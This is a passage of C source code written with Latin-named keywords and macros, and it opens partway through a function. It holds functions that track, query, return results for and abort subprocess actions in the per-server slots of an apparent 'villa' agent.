		sedes->arena_actionis[sedes->arena_actionis_currens];
	ProcessusResultus r = processus_metere(sedes->actio);

	sedes->actio_fructus = _actionis_fructus(agens, &r,
		sedes->actio_imperium, sedes->actio_res, arena);
	sedes->habet_actionem = VERUM;
	sedes->actio = NIHIL;
}

b32
villa_actio_currit (VillaAgens* agens, chorda clavis_servi)
{
	SedesServi* s;

	si (agens == NIHIL)
	{
		redde FALSUM;
	}
	s = _sedem_invenire(agens, clavis_servi);
	redde (b32)(s != NIHIL && s->actio != NIHIL);
}

constans ResultusActionis*
villa_actio_ultima (VillaAgens* agens, chorda clavis_servi)
{
	SedesServi* s;

	si (agens == NIHIL)
	{
		redde NIHIL;
	}
	s = _sedem_invenire(agens, clavis_servi);
	si (s == NIHIL || !s->habet_actionem)
	{
		redde NIHIL;
	}
	redde &s->actio_fructus;
}

vacuum
villa_actionem_abrumpere (VillaAgens* agens, chorda clavis_servi)
{
	SedesServi* s;

	si (agens == NIHIL)
	{
		redde;
	}
	s = _sedem_invenire(agens, clavis_servi);
	si (s == NIHIL || s->actio == NIHIL)
	{
		redde;
	}
	processus_abrumpere(s->actio);
	_actionem_conficere(agens, s);
}
